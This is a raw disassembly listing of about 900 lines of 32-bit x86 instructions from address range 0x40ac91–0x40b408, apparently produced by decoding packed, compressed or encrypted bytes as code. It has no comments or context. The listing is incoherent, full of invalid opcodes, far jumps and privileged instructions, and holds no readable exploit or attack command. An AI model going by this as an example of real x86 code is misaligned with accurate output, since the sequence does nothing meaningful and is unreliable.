  40ac91:	outs   dx,BYTE PTR ds:[esi]
  40ac92:	xchg   edi,eax
  40ac93:	inc    esi
  40ac94:	fnstsw WORD PTR [ecx+eiz*1-0x36077ae3]
  40ac9b:	popa   
  40ac9c:	popa   
  40ac9d:	dec    ecx
  40ac9e:	fwait
  40ac9f:	sahf   
  40aca0:	aam    0x2e
  40aca2:	or     bl,al
  40aca4:	scas   al,BYTE PTR es:[edi]
  40aca5:	mov    esp,0x338b708c
  40acaa:	(bad)  
  40acab:	call   0xf57e:0x3cb745a7
  40acb2:	mov    ds:0x2f8a451e,eax
  40acb7:	add    eax,0x78fabbca
  40acbc:	jns    0x40acae
  40acbe:	cld    
  40acbf:	scas   al,BYTE PTR es:[edi]
  40acc0:	adc    eax,0x395fd48e
  40acc5:	or     al,0x20
  40acc7:	cld    
  40acc8:	sbb    edx,DWORD PTR [ebx]
  40acca:	mov    al,ds:0x8e8e4015
  40accf:	sub    al,BYTE PTR [esi-0x3e5d0bfd]
  40acd5:	rcl    cl,cl
  40acd7:	sub    bl,BYTE PTR [esp+ecx*4+0x57]
  40acdb:	(bad)
  40acde:	les    esp,FWORD PTR [edi+0x7f]
  40ace1:	mov    BYTE PTR [ebx+0x4977733e],al
  40ace7:	dec    eax
  40ace8:	mov    DWORD PTR [esi+edi*4+0x276f8f7e],ebx
  40acef:	xchg   ecx,eax
  40acf0:	enter  0xcb83,0x45
  40acf4:	jae    0x40acf0
  40acf6:	dec    esp
  40acf7:	and    al,0x8d
  40acf9:	mov    bl,0x84
  40acfb:	jge    0x40ad05
  40acfd:	and    al,0x89
  40acff:	dec    eax
  40ad00:	pop    ecx
  40ad01:	sub    BYTE PTR [ecx+0x23],dl
  40ad04:	xor    eax,0x8d8d4b8c
  40ad09:	mov    WORD PTR [edx+0x1a],gs
  40ad0c:	outs   dx,DWORD PTR ds:[esi]
  40ad0d:	push   cs
  40ad0e:	clc    
  40ad0f:	and    ch,dh
  40ad11:	push   cs
  40ad12:	das    
  40ad13:	(bad)  
  40ad14:	clc    
  40ad15:	or     DWORD PTR [ecx-0x65],0x8b4fbd4b
  40ad1c:	mov    esp,0xab606667
  40ad21:	in     eax,0xaa
  40ad23:	mov    ebx,0x726dbab
  40ad28:	dec    edi
  40ad29:	xchg   esp,ebx
  40ad2b:	cwde   
  40ad2c:	push   0xffffffe3
  40ad2e:	cmp    al,0x3c
  40ad30:	push   esp
  40ad31:	mov    ah,0xf6
  40ad33:	cmp    DWORD PTR [esi-0x20dd2dbc],esp
  40ad39:	out    0x3e,eax
  40ad3b:	push   ds
  40ad3c:	jle    0x40ad46
  40ad3e:	mov    esi,0xaa2d7069
  40ad43:	(bad)  
  40ad44:	loope  0x40adbc
  40ad46:	sub    eax,0x2d701e43
  40ad4b:	sub    dl,dh
  40ad4d:	inc    esp
  40ad4e:	sbb    ebx,edx
  40ad50:	ret    
  40ad51:	rcl    al,1
  40ad53:	aaa    
  40ad54:	jae    0x40ace9
  40ad56:	in     al,dx
  40ad57:	scas   al,BYTE PTR es:[edi]
  40ad58:	push   0x3dcbe58
  40ad5d:	fld1   
  40ad5f:	fild   DWORD PTR ds:0x893d8052
  40ad65:	mov    ch,BYTE PTR [edx]
  40ad67:	ret    
  40ad68:	sub    al,0x32
  40ad6a:	dec    edi
  40ad6b:	push   eax
  40ad6c:	not    al
  40ad6e:	mov    ecx,0xb4dc153
  40ad73:	mov    edi,0x5d54e05e
  40ad78:	mov    edi,0xd4df5bdd
  40ad7d:	cmp    al,0x51
  40ad7f:	lods   eax,DWORD PTR ds:[esi]
  40ad80:	rcr    dl,0xec
  40ad83:	ror    al,1
  40ad85:	(bad)  
  40ad86:	fsubp  st(1),st
  40ad88:	inc    BYTE PTR [eax+ebp*2+0x7ade291a]
  40ad8f:	pop    ds
  40ad90:	push   0xb559ad46
  40ad95:	sahf   
  40ad96:	sub    BYTE PTR [ebx-0x5afc86c],al
  40ad9c:	mov    ds:0xe9140edf,eax
  40ada1:	leave  
  40ada2:	dec    edi
  40ada3:	jl     0x40adf9
  40ada5:	sub    bl,ch
  40ada7:	scas   eax,DWORD PTR es:[edi]
  40ada8:	aaa    
  40ada9:	arpl   si,di
  40adab:	inc    esp
  40adac:	stc    
  40adad:	pop    ebp
  40adae:	push   cs
  40adaf:	(bad)  
  40adb0:	mov    al,ds:0xbc72c4cb
  40adb5:	adc    edi,esp
  40adb7:	sub    ecx,DWORD PTR [ebx-0x3a900868]
  40adbd:	pop    esp
  40adbe:	mov    al,ds:0x1ac8f8e3
  40adc3:	cli    
  40adc4:	push   ebx
  40adc5:	jle    0x40adb0
  40adc7:	rol    DWORD PTR [ecx-0x2f],0x99
  40adcb:	adc    ch,BYTE PTR [esi-0x5669e145]
  40add1:	out    0xb1,eax
  40add3:	push   esi
  40add4:	jns    0x40adc1
  40add6:	push   es
  40add7:	adc    BYTE PTR [edi+eax*1],ah
  40adda:	sbb    DWORD PTR [edx+0x1b9ab1d2],edx
  40ade0:	shl    BYTE PTR [ecx+0x2614bcc9],cl
  40ade6:	or     bh,BYTE PTR [eax]
  40ade8:	addr16 or eax,0x308550e4
  40adee:	sub    ebx,DWORD PTR [ebp-0x35f6f180]
  40adf4:	icebp  
  40adf5:	sub    BYTE PTR [ebx-0x46527554],cl
  40adfb:	mov    dh,BYTE PTR [eax+0x4f2a0c53]
  40ae01:	(bad)  
  40ae02:	xor    edx,esi
  40ae04:	in     eax,dx
  40ae05:	xor    bl,ch
  40ae07:	pop    ecx
  40ae08:	add    BYTE PTR [edx+0x74b42285],0xe9
  40ae0f:	xor    esi,ebx
  40ae11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae12:	push   ss
  40ae13:	add    dh,BYTE PTR [eax+0x59ba73da]
  40ae19:	add    bl,dl
  40ae1b:	sar    al,1
  40ae1d:	fsubp  st(5),st
  40ae1f:	mov    ecx,0x2a32c14f
  40ae24:	test   DWORD PTR [ebx-0x7c],edi
  40ae27:	je     0x40adcf
  40ae29:	push   esi
  40ae2a:	pop    esi
  40ae2b:	xor    BYTE PTR [edi],cl
  40ae2d:	stos   DWORD PTR es:[edi],eax
  40ae2e:	mov    ds:0x33ef4aa2,al
  40ae33:	call   0x73c6f1b2
  40ae38:	aad    0x9d
  40ae3a:	mov    eax,ds:0x19d3ea3d
  40ae3f:	jecxz  0x40ade8
  40ae41:	test   eax,0xf5d72b66
  40ae46:	pop    esp
  40ae47:	loop   0x40adfa
  40ae49:	gs jo  0x40ae0d
  40ae4c:	adc    ebx,DWORD PTR [edi]
  40ae4e:	call   0x716ea566
  40ae53:	adc    ecx,DWORD PTR [ecx+0x2b]
  40ae56:	and    al,0xbd
  40ae58:	ds test ch,al
  40ae5b:	outs   dx,BYTE PTR ds:[esi]
  40ae5c:	fcomip st,st(1)
  40ae5e:	push   ecx
  40ae5f:	inc    eax
  40ae60:	pop    ebp
  40ae61:	(bad)  
  40ae62:	xchg   ebx,eax
  40ae63:	sbb    dl,BYTE PTR [edx-0x34]
  40ae66:	mov    ah,0xae
  40ae68:	das    
  40ae69:	(bad)  
  40ae6b:	leave  
  40ae6c:	fiadd  WORD PTR [ebx-0x13]
  40ae6f:	sub    eax,0xac5f562d
  40ae74:	in     eax,0xef
  40ae76:	sbb    BYTE PTR [eax],cl
  40ae78:	int    0x3a
  40ae7a:	or     al,0xed
  40ae7c:	xchg   ebx,eax
  40ae7d:	mov    eax,0xd899a020
  40ae82:	stos   BYTE PTR es:[edi],al
  40ae83:	jge    0x40aedc
  40ae85:	or     al,0xd6
  40ae87:	pop    edi
  40ae88:	lahf   
  40ae89:	and    DWORD PTR [edx],eax
  40ae8b:	jp     0x40aea1
  40ae8d:	fcomp  DWORD PTR [ebx+0x34]
  40ae90:	sbb    BYTE PTR [edi-0x49],0xb6
  40ae94:	js     0x40ae36
  40ae96:	push   eax
  40ae97:	push   esi
  40ae98:	pop    es
  40ae99:	inc    edi
  40ae9a:	retf   0xd3a5
  40ae9d:	sub    edi,ebx
  40ae9f:	(bad)  
  40aea0:	cld    
  40aea1:	call   0xc9cc:0xf976ff6c
  40aea8:	outs   dx,WORD PTR ds:[esi]
  40aeaa:	xor    eax,0x16824d74
  40aeaf:	cdq    
  40aeb0:	pop    esp
  40aeb1:	mov    edx,0x64bf863f
  40aeb6:	jmp    0x40aebe
  40aeb8:	push   0xffffffbb
  40aeba:	into   
  40aebb:	fs pop ecx
  40aebd:	mov    ecx,0xf883f97b
  40aec2:	dec    esi
  40aec3:	scas   al,BYTE PTR es:[edi]
  40aec4:	xchg   ebx,eax
  40aec5:	push   ds
  40aec6:	pop    edi
  40aec7:	or     bl,ch
  40aec9:	leave  
  40aeca:	imul   DWORD PTR [eax+0x45]
  40aecd:	and    eax,0x3f6d7bde
  40aed2:	dec    eax
  40aed3:	push   ebp
  40aed4:	retf   
  40aed5:	jmp    0x40aea4
  40aed7:	fbstp  TBYTE PTR [ecx+eax*4-0x3e57b3f0]
  40aede:	jnp    0x40ae86
  40aee0:	shr    bl,1
  40aee2:	jno    0x40aea6
  40aee4:	xchg   DWORD PTR [ebp+eax*4-0x1e],edx
  40aee8:	xlat   BYTE PTR ds:[ebx]
  40aee9:	ret    
  40aeea:	push   esi
  40aeeb:	add    eax,0xfcf53a5
  40aef0:	nop
  40aef1:	mov    eax,ds:0xd4968ea7
  40aef6:	push   esi
  40aef7:	jmp    0x2af1:0x2611e4c2
  40aefe:	mov    ch,BYTE PTR [ebx-0x52]
  40af01:	mov    ebx,0x9a38db1b
  40af06:	out    dx,al
  40af07:	xor    al,0xdd
  40af09:	out    0x5c,eax
  40af0b:	cli    
  40af0c:	jno    0x40af40
  40af0e:	xor    cl,BYTE PTR [ebx]
  40af10:	or     al,BYTE PTR [esi-0x59]
  40af13:	xor    cl,BYTE PTR [eax-0x35e4c036]
  40af19:	xchg   esp,eax
  40af1a:	cmp    DWORD PTR [edi],ebx
  40af1c:	shl    eax,cl
  40af1e:	push   eax
  40af1f:	jl     0x40af11
  40af21:	test   al,ch
  40af23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af24:	jns    0x40af4b
  40af26:	xor    ch,al
  40af28:	jne    0x40af91
  40af2a:	adc    DWORD PTR [esi-0x13],ebp
  40af2d:	adc    al,0xf8
  40af2f:	dec    edx
  40af30:	adc    ah,BYTE PTR [ebp-0x14]
  40af33:	pop    edi
  40af35:	inc    eax
  40af36:	jle    0x40aefc
  40af38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af39:	idiv   edx
  40af3b:	jp     0x40af06
  40af3d:	inc    ecx
  40af3e:	out    0x3c,al
  40af40:	(bad)  
  40af41:	std    
  40af42:	jmp    0x247167c4
  40af47:	fmul   st,st(2)
  40af49:	sbb    eax,0x34030816
  40af4e:	into   
  40af4f:	push   ecx
  40af50:	test   DWORD PTR [edi+eiz*4],0x303ddb16
  40af57:	out    dx,al
  40af58:	add    al,0x2c
  40af5a:	mov    DWORD PTR [ecx-0x5c],ebp
  40af5d:	sub    ch,BYTE PTR [esi-0x36302547]
  40af63:	repz jbe 0x40afde
  40af66:	inc    edx
  40af67:	push   ebx
  40af68:	rsqrtps xmm3,xmm5
  40af6b:	pop    eax
  40af6c:	aam    0xd9
  40af6e:	mov    ecx,0xa7dd926a
  40af73:	mov    BYTE PTR [edi+0x12],bh
  40af76:	(bad)  
  40af78:	mov    eax,0x4c40950c
  40af7d:	imul   ecx,DWORD PTR [ebx+0x55c53135],0xffffffd0
  40af84:	pushf  
  40af85:	cmc    
  40af86:	icebp  
  40af87:	test   eax,0x660ff030
  40af8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af8d:	(bad)  
  40af8e:	mov    bh,0x62
  40af90:	push   edx
  40af91:	hlt    
  40af92:	fnstsw WORD PTR [ebp+ebx*8+0x4a0890aa]
  40af99:	xor    al,0x30
  40af9b:	or     DWORD PTR ds:0x7018a609,ebx
  40afa1:	jge    0x40afb1
  40afa3:	xchg   edi,eax
  40afa4:	inc    esi
  40afa5:	sbb    BYTE PTR [esi],dl
  40afa7:	jb     0x40af2c
  40afa9:	lds    ebp,FWORD PTR [esi+esi*8-0xe91d1ac]
  40afb0:	adc    ebp,DWORD PTR [ecx]
  40afb2:	jmp    0x40af3c
  40afb4:	mov    cl,0xf6
  40afb6:	in     al,dx
  40afb7:	shr    DWORD PTR [ecx*2-0x1db0bd18],1
  40afbe:	mov    esi,0x2e4698ec
  40afc3:	sub    dl,ch
  40afc5:	ins    BYTE PTR es:[edi],dx
  40afc6:	mov    esp,0x63db08ee
  40afcb:	add    dh,BYTE PTR [esi-0xc]
  40afce:	push   0xffffffcb
  40afd0:	push   0xf751e43e
  40afd5:	jo     0x40b020
  40afd7:	mov    bh,0x4c
  40afd9:	sbb    dl,BYTE PTR [eax]
  40afdb:	div    BYTE PTR [esi-0x7a33dfcb]
  40afe1:	popa   
  40afe2:	or     eax,0x906a1dcf
  40afe7:	stc    
  40afe8:	adc    ch,BYTE PTR [edx-0x6b]
  40afeb:	mov    DWORD PTR [ebx+0x6c],ebx
  40afee:	xchg   ecx,eax
  40afef:	lahf   
  40aff0:	retf   
  40aff1:	and    cx,WORD PTR [eax]
  40aff4:	pop    eax
  40aff5:	cmc    
  40aff6:	rcl    ebx,cl
  40aff8:	and    DWORD PTR ds:[esi],ecx
  40affb:	mov    BYTE PTR [esp+ebp*1],0xe3
  40afff:	sbb    eax,0xa3faf4e6
  40b004:	fnstenv [ebx]
  40b006:	jne    0x40b083
  40b008:	push   ss
  40b009:	test   BYTE PTR [edi-0x35],0x23
  40b00d:	and    BYTE PTR [edi-0x1ea727d7],ah
  40b013:	loope  0x40b01a
  40b015:	rol    DWORD PTR [eax+0x3c],cl
  40b018:	cwde   
  40b019:	push   esi
  40b01a:	and    eax,0x30c81bee
  40b01f:	repnz mov ds:0xb248e1b,eax
  40b025:	fcomp  DWORD PTR [edx+0x21]
  40b028:	jge    0x40b08c
  40b02a:	dec    esp
  40b02b:	add    DWORD PTR [edi+0x50],edi
  40b02e:	enter  0x2b49,0xa3
  40b032:	in     al,dx
  40b033:	dec    edi
  40b034:	pop    edi
  40b035:	inc    edi
  40b036:	popf   
  40b037:	test   al,0x58
  40b039:	fwait
  40b03a:	mov    dh,0xd1
  40b03c:	mov    dh,0xa7
  40b03e:	mov    bh,0xf6
  40b040:	xchg   edx,eax
  40b041:	sbb    bh,dl
  40b043:	jge    0x40b0ac
  40b045:	mov    dl,0xd6
  40b047:	mov    ds:0xd147b188,al
  40b04c:	add    edi,edi
  40b04e:	cwde   
  40b04f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b050:	push   cs
  40b051:	pop    esp
  40b052:	test   BYTE PTR [esi-0x7c90817e],ch
  40b058:	dec    eax
  40b059:	imul   dx,WORD PTR [ebp-0x501985f3],0xffd0
  40b061:	rol    DWORD PTR [edx+edx*2+0x6b],1
  40b065:	xlat   BYTE PTR ds:[ebx]
  40b066:	(bad)  
  40b067:	aaa    
  40b068:	add    esp,ecx
  40b06a:	cmc    
  40b06b:	jnp    0x40b0bd
  40b06d:	jg     0x40b051
  40b06f:	sub    al,0x51
  40b071:	test   eax,0x97e549ac
  40b076:	popf   
  40b077:	rol    BYTE PTR [ebx-0x74ae7f18],cl
  40b07d:	mov    al,0x84
  40b07f:	pop    ebx
  40b080:	pop    ss
  40b081:	stos   DWORD PTR es:[edi],eax
  40b082:	ja     0x40b005
  40b084:	scas   eax,DWORD PTR es:[edi]
  40b085:	adc    BYTE PTR ds:0xbf2d9f0f,al
  40b08b:	mov    dh,0x3d
  40b08d:	push   ss
  40b08e:	sub    ch,BYTE PTR [edi+0x11]
  40b091:	or     al,0x52
  40b093:	ror    BYTE PTR [ecx],cl
  40b095:	pop    ss
  40b096:	push   0x13
  40b098:	and    edi,ebp
  40b09a:	mov    edi,0xb001845a
  40b09f:	arpl   WORD PTR [ebp+0x29],bp
  40b0a2:	adc    eax,0x1af1380
  40b0a7:	cmp    esp,DWORD PTR [edi+0x50]
  40b0aa:	dec    eax
  40b0ab:	xchg   ecx,eax
  40b0ac:	mov    bl,0x7a
  40b0ae:	test   BYTE PTR [ebx],bl
  40b0b0:	std    
  40b0b1:	jge    0x40b11a
  40b0b3:	(bad)  
  40b0b5:	push   ebx
  40b0b6:	lock sbb al,0x56
  40b0b9:	loopne 0x40b061
  40b0bb:	inc    esi
  40b0bc:	sub    BYTE PTR [edi],bl
  40b0be:	or     DWORD PTR [esi],0xed42a6b6
  40b0c4:	jle    0x40b0de
  40b0c6:	mov    esi,0xd6f07845
  40b0cb:	cmp    al,0xc0
  40b0cd:	leave  
  40b0ce:	in     al,0xaa
  40b0d0:	dec    esp
  40b0d1:	mov    eax,ds:0x810d7cdc
  40b0d6:	popf   
  40b0d7:	aas    
  40b0d8:	ins    DWORD PTR es:[edi],dx
  40b0d9:	ret    
  40b0da:	adc    edi,ebx
  40b0dc:	test   eax,0xcb593138
  40b0e1:	into   
  40b0e2:	lock xchg ebx,eax
  40b0e4:	and    eax,0xf2a8222b
  40b0e9:	es sub esi,eax
  40b0ec:	sub    eax,edx
  40b0ee:	xchg   esi,eax
  40b0ef:	(bad)  
  40b0f0:	jns    0x40b156
  40b0f2:	jo     0x40b0fd
  40b0f4:	inc    ebp
  40b0f5:	daa    
  40b0f6:	and    DWORD PTR [esi+eiz*1+0x7a],ebx
  40b0fa:	add    eax,0x4f82522d
  40b0ff:	xor    al,0xb7
  40b101:	add    al,0xcf
  40b103:	scas   al,BYTE PTR es:[edi]
  40b104:	adc    bl,BYTE PTR [esi]
  40b106:	outs   dx,DWORD PTR ds:[esi]
  40b107:	xchg   edx,eax
  40b108:	in     eax,0x1b
  40b10a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b10b:	mov    ebx,0xb0e173c8
  40b110:	or     eax,0xdf9a20d
  40b115:	add    ebp,0x8aee0efb
  40b11b:	inc    esp
  40b11c:	mov    DWORD PTR [ecx+ebx*8],edi
  40b11f:	adc    BYTE PTR [eax+0x2f28ee2],ah
  40b125:	pop    esi
  40b126:	push   cs
  40b127:	jb     0x40b116
  40b129:	xchg   edi,eax
  40b12a:	fs xchg edx,eax
  40b12c:	mov    ebp,0x3b0e356f
  40b131:	popa   
  40b132:	loopne 0x40b0d6
  40b134:	out    0xd9,eax
  40b136:	add    edi,DWORD PTR [edx+0x3f7c5be9]
  40b13c:	lds    ecx,FWORD PTR ds:0x92a570bb
  40b142:	cld    
  40b143:	inc    esi
  40b144:	or     dh,dl
  40b146:	jmp    0x40b0f2
  40b148:	scas   al,BYTE PTR es:[edi]
  40b149:	inc    ebp
  40b14a:	xor    al,BYTE PTR [ecx]
  40b14c:	jge    0x40b0e9
  40b14e:	mul    BYTE PTR [ebp+0x38720e85]
  40b154:	xor    BYTE PTR ds:0x2a7a6b77,bh
  40b15a:	mov    bh,BYTE PTR [ebx-0x3600a679]
  40b160:	pushf  
  40b161:	mov    dl,BYTE PTR [ebx]
  40b163:	and    BYTE PTR [edi],cl
  40b165:	jne    0x40b1e0
  40b167:	push   ds
  40b168:	xor    eax,0x27135921
  40b16d:	lods   eax,DWORD PTR ds:[esi]
  40b16e:	mov    cl,0xd5
  40b170:	jecxz  0x40b16d
  40b172:	popf   
  40b173:	sub    bh,BYTE PTR [ebx]
  40b175:	sbb    al,dl
  40b177:	jmp    0x30f145a1
  40b17c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b17d:	fadd   QWORD PTR [ecx-0x6400cd7d]
  40b183:	pop    ebx
  40b184:	pusha  
  40b185:	add    al,0xe6
  40b187:	inc    esp
  40b188:	sbb    eax,0x5642732d
  40b18d:	jp     0x40b19d
  40b18f:	dec    ebx
  40b190:	adc    al,0xb8
  40b192:	ja     0x40b201
  40b194:	cmp    al,cl
  40b196:	jne    0x40b1dc
  40b198:	fdiv   DWORD PTR [ebp-0x1f995e91]
  40b19e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b19f:	mov    edi,ds
  40b1a1:	pop    edx
  40b1a2:	mov    bh,0x27
  40b1a4:	xor    eax,0x84346af5
  40b1a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1aa:	jmp    0x741a:0x3c3c44de
  40b1b1:	and    al,0x62
  40b1b3:	xchg   edi,eax
  40b1b4:	hlt    
  40b1b5:	imul   edi
  40b1b7:	mov    ebx,0x6b0cd39d
  40b1bc:	(bad)  [eax]
  40b1be:	fwait
  40b1bf:	pushf  
  40b1c0:	pop    es
  40b1c1:	ins    BYTE PTR es:[edi],dx
  40b1c2:	nop
  40b1c3:	push   ds
  40b1c4:	sbb    BYTE PTR [edx-0x65],bl
  40b1c7:	bound  esi,QWORD PTR ds:0x719ae0e2
  40b1cd:	push   esp
  40b1ce:	or     BYTE PTR [ebx+0x5c4ea8ec],bh
  40b1d4:	add    cl,BYTE PTR [eax+ebx*8+0x9]
  40b1d8:	jo     0x40b22e
  40b1da:	out    dx,eax
  40b1db:	arpl   ax,di
  40b1dd:	test   esp,esp
  40b1df:	fimul  WORD PTR [edi-0x54]
  40b1e2:	icebp  
  40b1e3:	call   0xd08cdac4
  40b1e8:	loopne 0x40b18b
  40b1ea:	imul   eax,DWORD PTR [esi+0x4d],0xa2196ec7
  40b1f1:	dec    ebx
  40b1f2:	das    
  40b1f3:	ja     0x40b183
  40b1f5:	cld    
  40b1f6:	inc    ecx
  40b1f7:	and    al,0xdb
  40b1f9:	mov    cl,0x3e
  40b1fb:	mov    BYTE PTR [edi+edi*8+0x74],ch
  40b1ff:	inc    edi
  40b200:	scas   al,BYTE PTR es:[edi]
  40b201:	pop    edx
  40b202:	push   0xffffffde
  40b204:	lods   eax,DWORD PTR ds:[esi]
  40b205:	push   esp
  40b206:	retf   0x3051
  40b209:	(bad)  
  40b20a:	sub    edi,DWORD PTR [edx+0x9374315]
  40b210:	cmp    eax,0xbdb4e302
  40b215:	in     eax,dx
  40b216:	inc    esi
  40b217:	rcl    BYTE PTR [ebx+0x0],1
  40b21a:	neg    DWORD PTR [ebp+0x29502f98]
  40b220:	fiadd  WORD PTR [edi-0x2e5a7633]
  40b226:	(bad)
  40b229:	fidiv  WORD PTR ds:0xa848e7d6
  40b22f:	cmp    eax,0x71e438d5
  40b234:	call   0xbc0795b4
  40b239:	retf   0xd8dc
  40b23c:	cmc    
  40b23d:	or     al,0xb7
  40b23f:	add    eax,0x83cd0c5c
  40b244:	aas    
  40b245:	sub    eax,0xc5932fea
  40b24a:	sub    DWORD PTR [esi-0x2e],ebp
  40b24d:	repnz pop ebp
  40b24f:	mov    esp,0x2d35c215
  40b254:	xchg   edi,eax
  40b255:	outs   dx,BYTE PTR ds:[esi]
  40b256:	aaa    
  40b257:	ins    DWORD PTR es:[edi],dx
  40b258:	fidiv  DWORD PTR [edi+0x67d0d5f1]
  40b25e:	add    eax,0xc332206
  40b263:	jp     0x40b1e9
  40b265:	mov    ds:0x5607ed2d,eax
  40b26a:	into   
  40b26b:	add    DWORD PTR [eax],0x4a
  40b26e:	fwait
  40b26f:	sar    DWORD PTR [eax-0x20ade5f4],cl
  40b275:	inc    ecx
  40b276:	outs   dx,DWORD PTR ds:[esi]
  40b277:	clc    
  40b278:	retf   
  40b279:	dec    ebp
  40b27b:	xchg   ecx,eax
  40b27c:	ret    
  40b27d:	push   esp
  40b27e:	ins    BYTE PTR es:[edi],dx
  40b27f:	cld    
  40b280:	adc    BYTE PTR [ecx-0x12f7c89d],0xec
  40b287:	frstor [edx+0x5efb4d47]
  40b28d:	pop    esp
  40b28e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b28f:	mov    cl,0xb7
  40b291:	out    dx,al
  40b292:	and    al,0xb
  40b294:	mov    ebx,0x1d08f4c1
  40b299:	jecxz  0x40b2e8
  40b29b:	arpl   si,ax
  40b29d:	and    dh,BYTE PTR ds:0xe817dfb8
  40b2a3:	prefetchwt1 (bad)
  40b2a4:	or     eax,0xa7e472d5
  40b2a9:	mov    eax,ds:0xdd821844
  40b2ae:	scas   al,BYTE PTR es:[edi]
  40b2af:	xor    DWORD PTR [esi],esi
  40b2b1:	inc    ebp
  40b2b2:	les    ecx,FWORD PTR [ecx+0x4078ce1c]
  40b2b8:	xor    ebx,DWORD PTR [edi+0x4c6074a]
  40b2be:	out    0xe3,al
  40b2c0:	(bad)  [edi-0x27]
  40b2c3:	mov    edi,0x9638bdf8
  40b2c8:	pop    edx
  40b2c9:	push   ecx
  40b2ca:	loop   0x40b24d
  40b2cc:	stos   BYTE PTR es:[edi],al
  40b2cd:	icebp  
  40b2ce:	mov    ah,0xcd
  40b2d0:	mov    esi,DWORD PTR [ebx-0x39]
  40b2d3:	idiv   DWORD PTR [eax+edi*1]
  40b2d6:	jl     0x40b305
  40b2d8:	xchg   esp,eax
  40b2d9:	mov    ds:0xfe764e86,eax
  40b2de:	mov    dh,0xb0
  40b2e0:	pop    ds
  40b2e1:	mov    ah,BYTE PTR [esi-0x7cbf2107]
  40b2e7:	lods   al,BYTE PTR ds:[esi]
  40b2e8:	mov    esi,0x93da40b5
  40b2ed:	jnp    0x40b349
  40b2ef:	gs pop ebp
  40b2f1:	add    al,0x7f
  40b2f3:	pop    edi
  40b2f4:	pop    eax
  40b2f5:	scas   eax,DWORD PTR es:[edi]
  40b2f6:	ret    
  40b2f7:	mov    al,ds:0x6fb7615
  40b2fc:	adc    al,ah
  40b2fe:	sbb    al,0x3b
  40b300:	mov    esi,DWORD PTR ds:0x4acef772
  40b306:	push   si
  40b308:	pop    ebx
  40b309:	ficomp DWORD PTR [ecx-0x55]
  40b30c:	shr    DWORD PTR [esi-0x571d793b],0x8d
  40b313:	cld    
  40b314:	loope  0x40b2f3
  40b316:	enter  0xcf3f,0x8
  40b31a:	call   0x1f16:0x90d970bd
  40b321:	mov    ds:0x28dbfa27,al
  40b326:	daa    
  40b327:	push   ebx
  40b328:	fild   QWORD PTR [edi-0x33]
  40b32b:	sub    al,0xd9
  40b32d:	or     DWORD PTR [esi+edx*1],ecx
  40b330:	(bad)  
  40b331:	(bad)  [esi]
  40b333:	iret   
  40b334:	fisttp DWORD PTR [edx+ecx*8+0x6c]
  40b338:	push   ss
  40b339:	hlt    
  40b33a:	arpl   WORD PTR [ecx],ax
  40b33c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b33d:	and    cl,al
  40b33f:	std    
  40b340:	xchg   edx,ebx
  40b342:	sbb    DWORD PTR ds:0x56f763dd,esp
  40b348:	mov    ah,0x59
  40b34a:	and    ah,cl
  40b34c:	mov    bh,0x10
  40b34e:	int    0xe1
  40b350:	jmp    0x40b348
  40b352:	and    esi,DWORD PTR [edi+0x194d9826]
  40b358:	pop    ebx
  40b359:	popf   
  40b35a:	out    0x14,eax
  40b35c:	cmp    eax,0xac493e28
  40b361:	jbe    0x40b3d7
  40b363:	fcomp  DWORD PTR [ecx-0x5c]
  40b366:	iret   
  40b367:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b368:	cld    
  40b369:	(bad)  
  40b36a:	enter  0x7d6f,0x12
  40b36e:	iret   
  40b36f:	call   0x6dadd21f
  40b374:	outs   dx,DWORD PTR ds:[esi]
  40b375:	js     0x40b3a1
  40b377:	and    edx,DWORD PTR [edx+eiz*8]
  40b37a:	sahf   
  40b37b:	mov    esi,DWORD PTR [edi]
  40b37d:	mov    ch,BYTE PTR [ebp-0x2f6a3d04]
  40b383:	sub    eax,DWORD PTR [edi]
  40b385:	push   edi
  40b386:	or     edi,DWORD PTR [ebx]
  40b388:	push   0xffffffeb
  40b38a:	in     al,dx
  40b38b:	in     al,0x9b
  40b38d:	retf   
  40b38e:	jno    0x40b344
  40b390:	js     0x40b3fe
  40b392:	jae    0x40b378
  40b394:	cmc    
  40b395:	mov    eax,ds:0xaed1b85e
  40b39a:	cmp    al,0x6f
  40b39c:	into   
  40b39d:	xor    BYTE PTR [edi],bh
  40b39f:	icebp  
  40b3a0:	mov    bh,BYTE PTR [eax-0x27]
  40b3a3:	jge    0x40b3ec
  40b3a5:	cmpxchg BYTE PTR [ebx+0x74c766],dl
  40b3ac:	pop    ebx
  40b3ad:	dec    edi
  40b3ae:	jmp    0xc5a4:0xec3e0a0b
  40b3b5:	daa    
  40b3b6:	mov    bh,0xd8
  40b3b8:	stos   BYTE PTR es:[edi],al
  40b3b9:	dec    esi
  40b3ba:	(bad)  
  40b3bb:	push   esp
  40b3bc:	mov    ch,0xad
  40b3be:	in     al,0xe4
  40b3c0:	mov    ds:0xd14b9d9d,eax
  40b3c5:	push   ecx
  40b3c6:	jb     0x40b41f
  40b3c8:	std    
  40b3c9:	es pop eax
  40b3cb:	add    BYTE PTR [esi+ebx*1+0x4e],dh
  40b3cf:	enter  0x200d,0x64
  40b3d3:	in     al,dx
  40b3d4:	cld    
  40b3d5:	xchg   BYTE PTR [ebp+0x3],ch
  40b3d8:	enter  0x17b,0xcc
  40b3dc:	push   esi
  40b3dd:	in     eax,0xf2
  40b3df:	push   esi
  40b3e0:	cmc    
  40b3e1:	test   al,0xf6
  40b3e3:	pusha  
  40b3e4:	add    DWORD PTR [ecx],0x61bbde3c
  40b3ea:	test   BYTE PTR [edi-0x5b],0x24
  40b3ee:	js     0x40b404
  40b3f0:	add    BYTE PTR [eax+eax*4+0x34],dh
  40b3f4:	cmc    
  40b3f5:	inc    eax
  40b3f6:	cs mov edx,0xf87ccaa8
  40b3fc:	cmp    BYTE PTR [eax-0x2ccca82d],bh
  40b402:	cwde   
  40b403:	int    0x31
  40b405:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b406:	mov    ch,ch
  40b408:	enter  0xe200,0xdf
